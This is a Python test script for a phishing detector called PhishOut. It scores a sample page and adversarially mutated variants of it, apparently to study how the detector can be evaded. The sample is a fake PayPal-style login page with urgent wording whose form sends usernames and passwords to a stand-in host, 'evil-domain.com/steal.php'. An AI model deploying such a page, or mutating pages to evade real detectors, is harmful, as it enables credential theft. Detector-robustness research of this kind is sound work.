import os
import sys

# Setup paths
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

from attacker.webpage_state import WebPageState
from attacker.evaluator import Evaluator
from attacker.mutation_engine import MutationEngine

def main():
    print("="*75)
    print("PhishOut - Adversarial Mutation Engine Test")
    print("="*75)
    
    # 1. Initialize Evaluator
    print("\n[+] Initializing frozen evaluator (this will load models)...")
    evaluator = Evaluator()
    
    # 2. Get a sample phishing HTML
    sample_url = "https://update-account-security.paypal-verification.com/login"
    sample_html = """
    <html>
    <head><title>Verify Your Account</title></head>
    <body>
        <h1>Urgent: Verify your account immediately!</h1>
        <p>Your account will be suspended. Please enter your password to login and verify your identity.</p>
        <form action="http://evil-domain.com/steal.php" method="POST">
            <input type="text" name="username" placeholder="Email" />
            <input type="password" name="password" placeholder="Password" />
            <input type="submit" value="Login" />
        </form>
    </body>
    </html>
    """
    
    # 3. Create initial state
    print("\n[+] Evaluating original sample...")
    initial_state = WebPageState(
        original_url=sample_url,
        current_url=sample_url,
        original_html=sample_html,
        current_html=sample_html
    )
    
    # Populate original scores
    evaluator.populate_scores(initial_state)
    
    print(f"Original Structural Prob: {initial_state.original_scores['structural_probability']:.4f}")
    print(f"Original PhishOut Prob:   {initial_state.original_scores['fusion_probability']:.4f}")
    print(f"Original Verdict:         {initial_state.original_scores['verdict']}")
    
    # 4. Initialize Mutation Engine
    engine = MutationEngine()
    
    # 5. Generate Candidates
    print("\n[+] Generating mutated candidates (Depth 1)...")
    candidates = engine.generate_candidates(initial_state)
    
    # 6. Score Candidates and display
    print("\n{:<30} {:<15} {:<15} {:<10}".format("Mutation", "Structural", "PhishOut", "Valid"))
    print("-" * 75)
    
    for candidate in candidates:
        scores = evaluator.evaluate(candidate)
        candidate.current_scores = scores
        
        mutation_name = candidate.mutation_history[-1] if candidate.mutation_history else "None"
        struct_p = scores['structural_probability']
        fusion_p = scores['fusion_probability']
        
        # Valid is YES since generate_candidates validates them
        print("{:<30} {:<15.4f} {:<15.4f} {:<10}".format(
            mutation_name, struct_p, fusion_p, "YES"
        ))

if __name__ == "__main__":
    main()
